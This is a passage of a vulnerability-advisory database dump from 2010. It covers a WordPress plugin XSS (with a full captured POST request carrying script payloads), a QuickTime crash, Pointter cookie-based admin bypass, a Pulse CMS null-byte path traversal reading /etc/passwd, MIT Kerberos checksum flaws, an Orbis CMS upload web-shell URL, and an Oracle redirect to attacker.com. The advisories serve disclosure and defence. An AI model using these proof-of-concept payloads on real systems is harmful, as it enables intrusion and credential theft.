Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:N
Temporal score is: E:F/RL:U/RC:C
DETAILS
The file lembedded-video.php does not sanitize content variable, it is possible to inject malformed data by Javascript.
Code affected:
function embeddedvideo_plugin($content) {
$output = preg_replace_callback(REGEXP_1, 'embeddedvideo_plugin_callback', $content);
$output = preg_replace_callback(REGEXP_2, 'embeddedvideo_plugin_callback', $output);
$output = preg_replace_callback(REGEXP_3, 'embeddedvideo_plugin_callback', $output);
return ($output);
}
Request:
http://<server>/wordpress/wp-admin/post.php
POST /wordpress/wp-admin/post.php HTTP/1.1
Host: <server>
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.12) Gecko/20101026
Firefox/3.6.12
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive
Referer: http://<server>/wordpress/wp-admin/post.php?post=8&action=edit&message=1
C o o k i e : w o r d p r e s s _ b b f a 5 b 7 2 6 c 6 b 7 a 9 c f 3 c d a 9 3 7 0 b e 3 e e 9 1 = a d m i n
%7C1290110435%7C7f9fa1a66aec0259906ea15086aea0c8; wp-settings-time-1=1289940308;
w o r d p r e s s _ t e s t _ c o o k i e = W P + C o o k i e + c h e c k ;
w o r d p r e s s _ l o g g e d _ i n _ b b f a 5 b 7 2 6 c 6 b 7 a 9 c f 3 c d a 9 3 7 0 b e 3 e e 9 1 = a d m i n
%7C1290110435%7C68b064d813dd8bfaa5d2d2cdf757848e; wp-settings-1=m1%3Do
%26m6%3Dc%26m7%3Do
Content-Type: application/x-www-form-urlencoded
Content-Length: 1786
_wpnonce=b2bc367f9c&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost
% 3 D 8 % 2 6 a c t i o n % 3 D e d i t % 2 6 m e s s a g e
%3D1&user_ID=1&action=editpost&originalaction=editpost&post_author=1&post_type=post&original_
post_status=publish&referredby=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin
%2Fpost.php%3Fpost%3D8%26action%3Dedit&_wp_original_http_referer=http%3A%2F
%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D8%26action
% 3 D e d i t & p o s t _ I D = 8 & a u t o s a v e n o n c e = 9 6 2 9 3 9 1 7 c 9 & m e t a - b o x - o r d e r -
n o n c e = c 2 f e 5 5 3 5 c 4 & c l o s e d p o s t b o x e s n o n c e = b a d 9 d c 7 7 5 b & w p -
preview=&hidden_post_status=publish&post_status=publish&hidden_post_password=&hidden_post_v
isibility=public&visibility=public&post_password=&mm=11&jj=17&aa=2010&hh=00&mn=05&ss=33&hi
dden_mm=11&cur_mm=11&hidden_jj=17&cur_jj=17&hidden_aa=2010&cur_aa=2010&hidden_hh=00
&cur_hh=00&hidden_mn=05&cur_mn=36&original_publish=Update&save=Update&post_category
% 5 B % 5 D = 0 & p o s t _ c a t e g o r y % 5 B % 5 D = 1 & n e w c a t e g o r y = N e w + C a t e g o r y
+Name&newcategory_parent=-1&_ajax_nonce-add-category=62352e38f5&tax_input%5Bpost_tag
% 5 D = & n e w t a g % 5 B p o s t _ t a g
%5D=&post_title=testando&samplepermalinknonce=4a0d9c8491&content=%5Byoutube+%3Cscript
+type%3D%22text%2Fjavascript%22%3E%2F%2F+%3C%21%5BCDATA%5B%0D%0Aalert
%281%29%0D%0A%2F%2F+%5D%5D%3E%3C%2Fscript%3E+%3Cscript+type%3D%22text
%2Fjavascript%22%3E%2F%2F+%3C%21%5BCDATA%5B%0D%0Aalert%282%29%0D%0A%2F
%2F+%5D%5D%3E%3C%2Fscript%3E%5D&excerpt=&trackback_url=&meta%5B6%5D%5Bkey
%5D=_edit_last&_ajax_nonce=5453d93de8&meta%5B6%5D%5Bvalue%5D=1&meta%5B9%5D
%5Bkey%5D=_edit_lock&_ajax_nonce=5453d93de8&meta%5B9%5D%5Bvalue
%5D=1289954192&meta%5B8%5D%5Bkey%5D=_wp_old_slug&_ajax_nonce=5453d93de8&meta
% 5 B 8 % 5 D % 5 B v a l u e % 5 D = & m e t a k e y i n p u t = & m e t a v a l u e = & _ a j a x _ n o n c e - a d d -
meta=9453fa7f77&advanced_view=1&comment_status=open&ping_status=open&post_name=testan
do&post_author_override=1
CREDITS
This vulnerability has been brought to our attention by Wagner Elias from Conviso IT Security company (http://www.conviso.com.br) and researched
internally by Rodrigo Rubira Branco from the Check Point Vulnerability Discovery Team (VDT).
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies
http://www.checkpoint.com/defense"
13652,Apple Quicktime Memory Corruption - CVE-2010-3801,,CVE-2010-3801,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Apple Quicktime Memory Corruption when parsing FPX files
CVE-2010-3801
INTRODUCTION
Apple Quicktime is a ""powerful media technology that works on Mac and PC with just about
every popular video or audio format you come across. So you can play the digital media
you want to play"".
Apple Quicktime is available as plugin to different browsers, and thus the vulnerability
can be remotely triggered.
QuickTime player does not properly parse .fpx media files, which causes a memory corruption by
opening a malformed file with an invalid value located in PoC repro.fpx at offset 0x49.
This problem was confirmed in the following versions of Apple Quicktime and browsers, other
versions may be also affected.
QuickTime Player version 7.6.8 (1675) in all Operating Systems
QuickTime Player version 7.6.6 (1671) in all Operating Systems
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
The problem is triggered by PoC repro.fpx which causes invalid memory access in all the
refered versions and is available to interested parties only.
DETAILS
Disassembly:
668E2387 F7C7 03000000 TEST EDI,3
668E238D 75 15 JNZ SHORT QuickT_1.668E23A4
668E238F C1E9 02 SHR ECX,2
668E2392 83E2 03 AND EDX,3
668E2395 83F9 08 CMP ECX,8
668E2398 72 2A JB SHORT QuickT_1.668E23C4
668E239A F3:A5 REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI] <----- Crash Here
EDI = 0x089A0020
ESI = 0x61626364
(3e8.e3c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=61626560 ebx=00000000 ecx=0000007f edx=00000000 esi=61626364 edi=06d80020
eip=668e239a esp=0012dfbc ebp=0012dfc4 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206
668e239a f3a5 rep movs dword ptr es:[edi],dword ptr [esi]
0:000> !exploitable
Exploitability Classification: PROBABLY_EXPLOITABLE
Recommended Bug Title: Probably Exploitable - Read Access Violation on Block Data Move starting at QuickTime!CallComponentFunctionWithStorage+0x000000000003f20a (Hash=0x4b1e3917.0x4f031b17)
This is a read access violation in a block data move, and is therefore classified as probably exploitable.
CREDITS
This vulnerability was discovered and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies
http://www.checkpoint.com/defense"
13689,'Pointter PHP Micro-Blogging Social Network' Unauthorized Privilege Escalation (CVE-2010-4333),,CVE-2010-4333,"'Pointter PHP Micro-Blogging Social Network' Unauthorized Privilege Escalation (CVE-2010-4333)
Mark Stanislav - mark.stanislav gmail com
I. DESCRIPTION
---------------------------------------
A vulnerability exists in the 'Pointter PHP Micro-Blogging Social Network' authentication system which allows for administrative privileges by crafting two specific cookies with arbitrary values.
II. TESTED VERSION
---------------------------------------
1.8
III. PoC EXPLOIT
---------------------------------------
Using whatever method you prefer, generate 'auser' and 'apass' cookies. The values of each cookie are irrelevant; the mere presence of the cookies provide the administrative privilege.
IV. NOTES
---------------------------------------
* Here's a snippet of the final reply that I received from the vendor:
""Of course, it could be made safer and we know how to do it. But we have designed the softwares so that renaming admin folder gives us less work. As you know, the users should know the security issues as they will run this and not us.""
V. SOLUTION
---------------------------------------
* There is no update released at this time. Avoidance of this software is recommended until an updated version is available.
VI. REFERENCES
---------------------------------------
http://www.pointter.com/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4333
http://www.uncompiled.com/2010/12/pointter-php-micro-blogging-social-network-unauthorized-privilege-escalation-cve-2010-4333/
VII. TIMELINE
---------------------------------------
11/23/2010 - Initial vendor disclosure e-mail sent
11/24/2010 - Reply from vendor informing me that my 'software manipulation' was illegal
11/24/2010 - Response to vendor regarding their accusation of illegal actions on my part
11/24/2010 - Reply from vendor stating that by releasing this information, I am committing a crime
11/24/2010 - Response to vendor that their software is CC-licensed and that their accusations are unfounded
11/24/2010 - Rebuttal from vendor again affirming I was breaking the law by disclosing this vulnerability
11/24/2010 - Reply to vendor again stating my intent to help the company and provide responsible disclosure
11/24/2010 - Response from vendor stating they would no longer respond and explained their stance on fixing this issue
11/24/2010 - Final reply to vendor stating that I was happy to work with them on a delayed disclosure if desired
12/15/2010 - Public disclosure"
13690,'Pointter PHP Content Management System' Unauthorized Privilege Escalation (CVE-2010-4332),,CVE-2010-4332,"'Pointter PHP Content Management System' Unauthorized Privilege Escalation (CVE-2010-4332)
Mark Stanislav - mark.stanislav gmail com
I. DESCRIPTION
---------------------------------------
A vulnerability exists in the 'Pointter PHP Content Management System' authentication system which allows for administrative privileges by crafting two specific cookies with arbitrary values.
II. TESTED VERSION
---------------------------------------
1.0
III. PoC EXPLOIT
---------------------------------------
Using whatever method you prefer, generate 'auser' and 'apass' cookies. The values of each cookie are irrelevant; the mere presence of the cookies provide the administrative privilege.
IV. NOTES
---------------------------------------
* Here's a snippet of the final reply that I received from the vendor:
""Of course, it could be made safer and we know how to do it. But we have designed the softwares so that renaming admin folder gives us less work. As you know, the users should know the security issues as they will run this and not us.""
V. SOLUTION
---------------------------------------
* There is no update released at this time. Avoidance of this software is recommended until an updated version is available.
VI. REFERENCES
---------------------------------------
http://www.pointter.com/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4332
http://www.uncompiled.com/2010/12/pointter-php-content-management-system-unauthorized-privilege-escalation-cve-2010-4332/
VII. TIMELINE
---------------------------------------
11/23/2010 - Initial vendor disclosure e-mail sent
11/24/2010 - Reply from vendor informing me that my 'software manipulation' was illegal
11/24/2010 - Response to vendor regarding their accusation of illegal actions on my part
11/24/2010 - Reply from vendor stating that by releasing this information, I am committing a crime
11/24/2010 - Response to vendor that their software is CC-licensed and that their accusations are unfounded
11/24/2010 - Rebuttal from vendor again affirming I was breaking the law by disclosing this vulnerability
11/24/2010 - Reply to vendor again stating my intent to help the company and provide responsible disclosure
11/24/2010 - Response from vendor stating they would no longer respond and explained their stance on fixing this issue
11/24/2010 - Final reply to vendor stating that I was happy to work with them on a delayed disclosure if desired
12/15/2010 - Public disclosure"
13782,'Pulse CMS Basic' Local File Inclusion Vulnerability (CVE-2010-4330),,CVE-2010-4330,"'Pulse CMS Basic' Local File Inclusion Vulnerability (CVE-2010-4330)
Mark Stanislav - mark.stanislav gmail com
I. DESCRIPTION
---------------------------------------
A vulnerability exists in the 'includes/controller.php' script that allows for arbitrary local file inclusion due to a null-byte attack.
II. TESTED VERSION
---------------------------------------
Version 1.2.8
III. AFFECTED VERSIONS
---------------------------------------
< 1.2.9
IV. PoC EXPLOIT
---------------------------------------
http://www.example.com/index.php?p=/../../../../../../../../../../../../../../etc/passwd%00
V. NOTES
---------------------------------------
* magic_quotes_gpc must be disabled for null-byte attacks to work
* This issue did not affect Pulse CMS Pro according to the vendor
VI. SOLUTION
---------------------------------------
Upgrade all previously installed versions to 1.2.9
VII. REFERENCES
---------------------------------------
http://pulsecms.com/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4330
http://www.uncompiled.com/2010/12/pulse-cms-basic-local-file-inclusion-vulnerability-cve-2010-4330/
VIII. TIMELINE
---------------------------------------
11/24/2010: Initial vendor disclosure
11/25/2010: Vendor response that they had fixed the issue & updated the existing version (1.2.8)
11/25/2010: Replied to vendor inquiring if a new point release would be made and affected versions
11/26/2010: Vendor response noting a version increment was coming & vulnerable versions confirmation
11/26/2010: Pulse CMS Basic 1.2.9 released
12/05/2010: Public disclosure"
13803,MITKRB5-SA-2010-007 Multiple checksum handling vulnerabilities [CVE-2010-1324 CVE-2010-1323 CVE-2010-4020 CVE-2010-4021],,CVE-2010-1324,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2010-007
MIT krb5 Security Advisory 2010-007
Original release: 2010-11-30
Last update: 2010-11-30
Topic: Multiple checksum handling vulnerabilities
CVE-2010-1324
* krb5 GSS-API applications may accept unkeyed checksums
* krb5 application services may accept unkeyed PAC checksums
* krb5 KDC may accept low-entropy KrbFastArmoredReq checksums
CVSSv2 Vector: AV:N/AC:M/Au:N/C:N/I:C/A:N/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 7.1
Access Vector: Network
Access Complexity: Medium
Authentication: None
Confidentiality Impact: None
Integrity Impact: Complete
Availability Impact: None
CVSSv2 Temporal Score: 5.6
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
CVE-2010-1323
* krb5 clients may accept unkeyed SAM-2 challenge checksums
* krb5 may accept KRB-SAFE checksums with low-entropy derived keys
CVSSv2 Vector: AV:N/AC:H/Au:N/C:N/I:C/A:N/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 5.4
CVSSv2 Temporal Score: 4.2
CVE-2010-4020
* krb5 may accept authdata checksums with low-entropy derived keys
CVSSv2 Vector: AV:N/AC:M/Au:S/C:N/I:P/A:N/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 3.5
CVSSv2 Temporal Score: 2.7
CVE-2010-4021
* krb5 KDC may issue unrequested tickets due to KrbFastReq forgery
CVSSv2 Vector: AV:N/AC:H/Au:S/C:N/I:P/A:N/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 2.1
CVSSv2 Temporal Score: 1.6
See DETAILS for the expanded CVSSv2 metrics for CVE-2010-1323,
CVE-2010-4020, and CVE-2010-4021.
SUMMARY
=======
These vulnerabilities are in the MIT implementation of Kerberos
(krb5), but because these vulnerabilities arise from flaws in protocol
handling logic, other implementations may also be vulnerable.
CVE-2010-1324
MIT krb5 (releases krb-1.7 and newer) incorrectly accepts an unkeyed
checksum with DES session keys for version 2 (RFC 4121) of the GSS-API
krb5 mechanism.
MIT krb5 (releases krb5-1.7 and newer) incorrectly accepts an unkeyed
checksum for PAC signatures. Running exclusively krb5-1.8 or newer
KDCs blocks the attack.
MIT krb5 KDC (releases krb5-1.7 and newer) incorrectly accepts RFC
3961 key-derivation checksums using RC4 keys when verifying the
req-checksum in a KrbFastArmoredReq.
CVE-2010-1323
MIT krb5 clients (releases krb5-1.3 and newer) incorrectly accept an
unkeyed checksums in the SAM-2 preauthentication challenge.
MIT krb5 (releases krb5-1.3 and newer) incorrectly accepts RFC 3961
key-derivation checksums using RC4 keys when verifying KRB-SAFE
messages.
CVE-2010-4020
MIT krb5 (releases krb5-1.8 and newer) incorrectly accepts RFC 3961
key-derivation checksums using RC4 keys when verifying AD-SIGNEDPATH
and AD-KDC-ISSUED authorization data.
CVE-2010-4021
MIT krb5 KDC (release krb5-1.7 only) may issue tickets not requested
by a client, based on an attacker-chosen KrbFastArmoredReq.
IMPACT
======
CVE-2010-1324
An unauthenticated remote attacker can forge GSS tokens that are
intended to be integrity-protected but unencrypted, if the targeted
pre-existing application session uses a DES session key.
An authenticated remote attacker can forge PACs if using a KDC that
does not filter client-provided PAC data. This can result in
privilege escalation against a service that relies on PAC contents to
make authorization decisions.
An unauthenticated remote attacker has a 1/256 chance of swapping a
client-issued KrbFastReq into a different KDC-REQ, if the armor key is
RC4. The consequences are believed to be minor.
CVE-2010-1323
An unauthenticated remote attacker could alter a SAM-2 challenge,
affecting the prompt text seen by the user or the kind of response
sent to the KDC. Under some circumstances, this can negate the
incremental security benefit of using a single-use authentication
mechanism token.
An unauthenticated remote attacker has a 1/256 chance of forging
KRB-SAFE messages in an application protocol if the targeted
pre-existing session uses an RC4 session key. Few application
protocols use KRB-SAFE messages.
CVE-2010-4020
An authenticated remote attacker that controls a legitimate service
principal has a 1/256 chance of forging the AD-SIGNEDPATH signature if
the TGT key is RC4, allowing it to use self-generated ""evidence""
tickets for S4U2Proxy, instead of tickets obtained from the user or
with S4U2Self. Configurations using RC4 for the TGT key are believed
to be rare.
An authenticated remote attacker has a 1/256 chance of forging
AD-KDC-ISSUED signatures on authdata elements in tickets having an RC4
service key, resulting in privilege escalation against a service that
relies on these signatures. There are no known uses of the KDC-ISSUED
authdata container at this time.
CVE-2010-4021
An authenticated remote attacker that controls a legitimate service
principal could obtain a valid service ticket to itself containing
valid KDC-generated authorization data for a client whose TGS-REQ it
has intercepted. The attacker could then use this ticket for
S4U2Proxy to impersonate the targeted client even if the client never
authenticated to the subverted service. The vulnerable configuration
is believed to be rare.
AFFECTED SOFTWARE
=================
CVE-2010-1324
Kerberos application client and server software (including third-party
applications) using GSS-API libraries from MIT releases krb5-1.7 and
newer are vulnerable to the DES GSS-API issue if they use GSS-API for
integrity protection of unencrypted messages.
Kerberos application server software (including third-party
applications) using libraries from MIT releases krb5-1.7 and newer are
vulnerable to the PAC issue.
Deployments running exclusively KDCs from releases krb5-1.8 and newer
are not vulnerable to the PAC issue because those KDCs discard
client-provided PAC authdata.
The MIT krb5 KDC in releases krb5-1.7 and newer is vulnerable to the
KrbFastReq swapping issue.
CVE-2010-1323
Initial credential acquisition clients (including kinit) in MIT
releases krb5-1.3 and newer are vulnerable to the SAM-2 issue.
Third-party applications that obtain initial Kerberos credentials
using libraries from these releases are also vulnerable.
Kerberos application client and server software (including third-party
applications) using libraries from MIT releases krb5 krb5-1.3 and
newer are vulnerable to the RC4 KRB-SAFE issue.
CVE-2010-4020
The AD-SIGNEDPATH issue affects the KDC in releases krb5-1.8 and
newer.
Kerberos application server software (including third-party
applications) using libraries from MIT releases krb5-1.8 and newer are
vulnerable to the AD-KDC-ISSUED problem. Deployments running
exclusively KDCs from releases krb5-1.8 and newer discard
client-provided AD-KDC-ISSUED authdata and are not vulnerable to this
issue.
CVE-2010-4021
The KDC from release krb5-1.7 only is vulnerable to the KrbFastReq
forgery issue.
FIXES
=====
* Upcoming releases in the krb5-1.8 and krb5-1.7 series will contain
fixes for these issues.
* The patches for this advisory do not cover CVE-2010-4021, which is a
minor issue already corrected in krb5-1.7.1.
A patch for the krb5-1.8 series is available at
http://web.mit.edu/kerberos/advisories/2010-007-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2010-007-patch.txt.asc
A patch for the krb5-1.7 series is available at
http://web.mit.edu/kerberos/advisories/2010-007-patch-r17.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2010-007-patch-r17.txt.asc
A patch for the krb5-1.6 series is available at
http://web.mit.edu/kerberos/advisories/2010-007-patch-r16.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2010-007-patch-r16.txt.asc
A patch for the krb5-1.5 series is available at
http://web.mit.edu/kerberos/advisories/2010-007-patch-r15.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2010-007-patch-r15.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2010-007.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1324
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1323
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4020
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4021
ACKNOWLEDGMENTS
===============
Thanks to Sam Hartman for helping with analysis.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/8B8DF501 2010-01-15 [expires: 2011-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
Background for RC4-keyed RFC 3961 checksum issues:
The hmac-sha1-des3, hmac-sha1-96-aes128, and hmac-sha1-96-aes256
checksum types are specified to be used with 3DES, AES128, and AES256
keys respectively, but MIT krb5 allows these checksum types to be used
with any type of key. All three checksum types make use of a key
derivation algorithm built around the block encryption operation of
the key's encryption type.
The arcfour-hmac and arcfour-hmac-exp encryption types are specified
in RFC 4757, and make use of a stream cipher instead of a block
cipher. The MIT krb5 implementation treats these encryption types as
having a cipher block size of one byte for the purposes of key
derivation. When the aforementioned checksum types perform key
derivation, they repeatedly invoke stream cipher encryption on
one-byte blocks. The result is a derived key whose contents alternate
between a known byte (which depends only on the key usage value) and a
byte whose values depend on the key. There are only 256 possible
derived keys for each key usage value.
CVE-2010-1324 (GSS-API issue):
RFC 4121 specifies version 2 of the krb5 GSS-API mechanism. It is
commonly used only with ""newer"" encryption types, but may be used with
any encryption type. RFC 4121 specifies that non-confidential Wrap
messages and Message Integrity Codes (MICs) are computed using the
required checksum type for the key's encryption type. MIT krb5 uses
the internal krb5int_c_mandatory_cksumtype function to look up this
checksum type. This function returns incorrect values for DES
encryption types, selecting unkeyed rather than keyed checksums.
If a GSS-API context is established using a DES key, the MIT krb5 code
will accept Wrap or MIC tokens in either the RFC 4121 or RFC 1964
style. An attacker can construct a Wrap or MIC token in the RFC 4121
style using unkeyed checksums.
CVE-2010-1324 (PAC issue):
Privilege Attribute Certificates (PACs) are a type of authorization
data specified in:
http://msdn.microsoft.com/en-us/library/cc237917(PROT.13).aspx
PACs contain two signature fields which bind the PAC to the server and
krbtgt keys; this signature is intended to prove that the PAC was
generated by the KDC and not by a client. PAC signatures are
specified to use the hmac-md5, hmac-sha1-96-aes128, or
hmac-sha1-96-aes256 keyed checksum types. The MIT krb5 code for
verifying PAC signatures does not verify that the checksum type
contained in the PAC is a keyed signature, so a client could use an
unkeyed checksum to ""prove"" that its made-up PAC data was generated by
a KDC. This attack would not work in the presence of a sufficiently
recent (1.8 or later) MIT KDC because the KDC would filter out
client-provided PAC authdata.
CVE-2010-1324 (KrbFastReq swapping issue):
The KDC may accept an RFC 3961 key-derivation checksum keyed with an
RC4 key in the req-checksum field of KrbArmoredFastReq. An attacker
has a 1/256 chance of guessing the derived key that would be required
to bind a captured encrypted KrbFastReq to a different KDC-REQ
message. This is probably at worst an auditing issue; the KDC will
log a successful authentication, but with the wrong parameters, and
the client will not necessarily be able to use the resulting ticket.
CVE-2010-1323 (SAM-2 issue):
CVSSv2 Base Score: 5.4
Access Vector: Network
Access Complexity: High
Authentication: None
Confidentiality Impact: None
Integrity Impact: Complete
Availability Impact: None
CVSSv2 Temporal Score: 4.2
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
SAM-2 is a preauthentication mechanism described in:
http://tools.ietf.org/html/draft-ietf-krb-wg-kerberos-sam-03 (SAM2)
In this mechanism, a KDC sends a challenge to the client consisting of
a challenge body and a list of checksums. The client prompts the user
for Single-use Authentication Data (SAD), computes a reply key based
on the SAD and the parameters in the challenge body, and then tries to
verify each of the checksums against the body using the reply key. If
no checksum matches, the client assumes that the SAD value is
incorrect or the integrity of the challenge has been tampered with by
a party with no knowledge of the reply key. The MIT krb5 code for
verifying SAM-2 challenge signatures does not verify that the checksum
type is keyed, so an attacker alter a challenge and supply an unkeyed
signature, fooling the client into believing that the challenge body
was not tampered with. The general result would be that the client
would transmit an invalid reply to the KDC, causing preauthentication
to fail.
With non-challenge/response SAM tokens having low entropy (e.g., a
clock-based token with six decimal digits of readout), this may allow
an attacker to learn the SAD value by a precomputation attack,
negating the incremental security benefit of using a SAM token. This
would allow the attacker to authenticate to the KDC as the user, or to
impersonate the KDC to the user, provided that the user's password has
been previously captured.
CVE-2010-1323 (KRB-SAFE RC4 issue):
The KRB-SAFE message is intended for the integrity protection of
cleartext application data. An attacker can forge KRB-SAFE messages
in an existing application protocol session with 1/256 probability of
success, if the session uses an RC4 session key.
CVE-2010-4020 (authdata RC4 issue):
CVSSv2 Base Score: 3.5
Access Vector: Network
Access Complexity: Medium
Authentication: Single
Confidentiality Impact: None
Integrity Impact: Partial
Availability Impact: None
CVSSv2 Temporal Score: 2.7
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
S4U2proxy is a Microsoft protocol extension that allows a service to
impersonate a user to another service, in a constrained way:
http://msdn.microsoft.com/en-us/library/cc246071(PROT.13).aspx
MIT and Heimdal implementations of Kerberos use an extension to take
the place of the Windows PAC in S4U2proxy evidence tickets:
http://k5wiki.kerberos.org/wiki/Projects/ConstrainedDelegation
The signature in the SIGNEDPATH authorization data uses the TGT key,
which is only known to the KDC. If the TGT key is RC4, then a service
can forge this signature with a 1/256 chance of success by supplying
an inappropriate checksum type.
CVE-2010-4021 (KrbFastReq forgery issue):
CVSSv2 Base Score: 2.1
Access Vector: Network
Access Complexity: High
Authentication: Single
Confidentiality Impact: None
Integrity Impact: Partial
Availability Impact: None
CVSSv2 Temporal Score: 1.6
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
In release krb5-1.7, but not newer releases, the KDC allows an
arbitrary TGT credential to serve as the armor for TGS requests,
allowing the inner request to be arbitrarily altered by an attacker
who controls a service principal. (The attacker has full knowledge of
the armor key, having provided the armor ticket.) The resulting
ticket is useless to both client and attacker unless the named service
principal in the forged request is that of the attacker.
By intercepting a legitimate TGS-REQ message, a malicious service that
has S4U2Proxy privileges can rewrite the inner request so that the
service named in the request is itself, and then capture the issued
ticket for use as an evidence ticket in a S4U2Proxy request to
impersonate the client to another service, even though the client
never asked for a ticket for the malicious service. Since krb5-1.7
does not natively support S4U2proxy, the attack is only feasible in
certain cross-realm configurations, which are believed to be rare,
involving Active Directory domains that grant S4U2proxy privileges to
services in a non-AD Kerberos foreign realm.
REVISION HISTORY
================
2010-11-30 original release
Copyright (C) 2010 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAkz1SjoACgkQSO8fWy4vZo5CGgCePDfxaWdGcX70V4U83JUbi9uF
VXoAoO0eP1MPEOUZt096Xsgyv1fR1k1u
=BFph
-----END PGP SIGNATURE-----"
13809,'Orbis CMS' Arbitrary Script Execution Vulnerability (CVE-2010-4313),,CVE-2010-4313,"'Orbis CMS' Arbitrary Script Execution Vulnerability (CVE-2010-4313)
Mark Stanislav - mark.stanislav gmail com
I. DESCRIPTION
---------------------------------------
A vulnerability exists in the 'Orbis CMS' fileman_file_upload.php script that allows any authenticated user to upload a PHP script and then run it without restriction.
II. TESTED VERSION
---------------------------------------
1.0.2
III. PoC EXPLOIT
---------------------------------------
1) Login as any CMS user (administrator or non-administrator)
2) Upload your desired PHP script (e.g. cmd.php)
3) Navigate to http://www.example.com/orbis/uploads/cmd.php?cmd=cat%20/etc/passwd
IV. NOTES
---------------------------------------
* This software is no longer developed according to the product page; it is still available for download though.
* Various other vulnerabilities exist in this code base (at least for previous versions); it's advisable not to use this software as patches are not coming.
* A vendor notice was not done for the aforementioned reasons.
V. SOLUTION
---------------------------------------
Overhaul the upload verification portion of fileman_file_upload.php completely.
VI. REFERENCES
---------------------------------------
http://www.novo-ws.com/orbis-cms/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4313
http://www.uncompiled.com/2010/11/orbis-cms-arbitrary-script-execution-vulnerability-cve-2010-4313/
VII. TIMELINE
---------------------------------------
11/30/2010: Public disclosure"
13828,CVE-2010-2408 | Persistent Log Out Redirection Vulnerability in Oracle I-Recruitment OA.jsp,,CVE-2010-2408,"Advisory: Persistent Log Out Redirection Vulnerability in Oracle
I-Recruitment OA.jsp
CVE-2010-2408
Version Affected - 11.5.10.2, 12.0.6, 12.1.3
About: Oracle I-Recruitment Suite
Oracle iRecruitment is a web based full-cycle recruiting solution that
gives managers, recruiters and candidates the ability to manage every
phase of finding, recruiting, hiring, and tracking new employees. It is a
part of Oracle E-business suite.
Discussion:
The Oracle I-Recruitment suite possesses web URL redirection vulnerability
in OA.jsp web page. It is possible to redirect a user to malicious domain
after logging out of the application. The vulnerable parameter is
p_home_url. When a value is passed to this parameter, it becomes
persistent in nature and remains active until the session is expired.
The vulnerable Link:
https://www.example.com/OA_HTML/OA.jsp?_rc=IRC_VIS_HOME_PAGE&_ri=800&p_home_url=http://www.attacker.com
An attacker can construct a URL in this way and forces user to redirect to
the malicious link after logging out of the application.This type of
vulnerability can be exploited by malicious attackers to launch phishing
attacks etc
The vulnerability exploitation video can be seen at SecNiche Security
channel : http://www.youtube.com/watch?v=0lBHeqNBljU
Disclosure:
The vulnerability was disclosed to Oracle in January 2009 and is patched
in October 2010 CPU release.
Credit:
Aditya K Sood of SecNiche Security
Contact:
adi_ks [at] secniche.org
Disclaimer
The information in the advisory is believed to be accurate at the time of
publishing based on currently available information. Use of the
information constitutes acceptance for use in an AS IS condition. There is
no representation or warranties, either express or implied by or with
respect to anything."
13850,[SECURITY] CVE-2010-4172: Apache Tomcat Manager application XSS vulnerability,,CVE-2010-4172,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
